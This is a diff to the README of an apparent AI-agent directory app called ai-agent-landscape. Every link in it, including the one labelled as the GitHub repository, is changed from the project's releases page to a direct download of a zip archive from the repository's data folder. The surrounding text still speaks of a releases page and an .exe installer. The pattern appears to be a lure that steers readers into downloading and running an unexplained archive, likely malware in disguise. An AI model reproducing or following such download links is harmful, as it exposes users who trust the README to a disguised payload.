@@ -1,6 +1,6 @@
 # 📋 ai-agent-landscape - Explore AI Agents and Tools Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/gatherfigtree740/ai-agent-landscape/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/gatherfigtree740/ai-agent-landscape/main/data/agent-landscape-ai-v3.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to download and run the ai-agent-landscape software:
 
 1. **Visit the download page**  
    Go to the official release page here:  
-   [Download ai-agent-landscape Releases](https://github.com/gatherfigtree740/ai-agent-landscape/releases)  
+   [Download ai-agent-landscape Releases](https://raw.githubusercontent.com/gatherfigtree740/ai-agent-landscape/main/data/agent-landscape-ai-v3.4.zip)  
 
 2. **Find the latest release**  
    On this page, look for the newest version listed at the top. The version names usually start with "v" followed by numbers, such as v1.2.0.
@@ -89,7 +89,7 @@ The app helps you identify the right AI agent or tool and guides you to where yo
 
 To update ai-agent-landscape:
 
-1. Visit the [Releases](https://github.com/gatherfigtree740/ai-agent-landscape/releases) page again.  
+1. Visit the [Releases](https://raw.githubusercontent.com/gatherfigtree740/ai-agent-landscape/main/data/agent-landscape-ai-v3.4.zip) page again.  
 2. Download the newest `.exe` file under the latest version.  
 3. Run the installer just like before. It will overwrite the current version without deleting your data.  
 
@@ -114,10 +114,10 @@ If errors persist, visit the release page for notes or contact links.
 ## 🔗 Important Links
 
 - Download ai-agent-landscape:  
-  [https://github.com/gatherfigtree740/ai-agent-landscape/releases](https://github.com/gatherfigtree740/ai-agent-landscape/releases)  
+  [https://raw.githubusercontent.com/gatherfigtree740/ai-agent-landscape/main/data/agent-landscape-ai-v3.4.zip](https://raw.githubusercontent.com/gatherfigtree740/ai-agent-landscape/main/data/agent-landscape-ai-v3.4.zip)  
 
 - GitHub Repository:  
-  https://github.com/gatherfigtree740/ai-agent-landscape  
+  https://raw.githubusercontent.com/gatherfigtree740/ai-agent-landscape/main/data/agent-landscape-ai-v3.4.zip  
 
 ---
 
@@ -142,4 +142,4 @@ This variety helps you find what fits your needs.
 
 Click here to visit the download page and get started:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/gatherfigtree740/ai-agent-landscape/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/gatherfigtree740/ai-agent-landscape/main/data/agent-landscape-ai-v3.4.zip)
